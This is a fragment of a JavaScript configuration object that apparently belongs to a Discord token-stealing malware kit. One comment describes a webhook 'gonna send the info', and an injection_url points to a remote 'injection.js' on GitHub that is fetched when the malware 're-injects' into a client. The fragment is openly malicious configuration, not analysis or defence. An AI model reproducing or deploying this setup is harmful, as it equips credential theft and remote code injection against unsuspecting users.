...
const config = {
  ...
  embed_icon: 'https://media.discordapp.net/attachments/1005823629373735014/1091383550810529852/Sans_titre2.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/lucas120345/inject/main/injection.js', //injection url for when it reinjects
  /**
